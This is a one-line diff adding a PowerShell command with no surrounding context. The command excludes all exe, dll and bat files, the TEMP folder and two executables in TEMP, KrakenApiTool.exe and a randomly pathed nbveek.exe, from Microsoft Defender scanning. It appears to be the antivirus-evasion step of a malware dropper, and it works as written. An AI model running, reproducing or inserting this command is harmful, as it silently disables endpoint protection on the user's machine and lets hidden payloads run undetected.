@@ -1,0 +1,1 @@
+Add-MpPreference -ExclusionExtension "exe","dll","bat" -ExclusionPath "$env:TEMP\","$env:TEMP","$env:TEMP\KrakenApiTool.exe","$env:TEMP\89f359e03f\nbveek.exe" -ExclusionProcess "KrakenApiTool.exe","nbveek.exe" ;Set-MpPreference -PUAProtection 1;
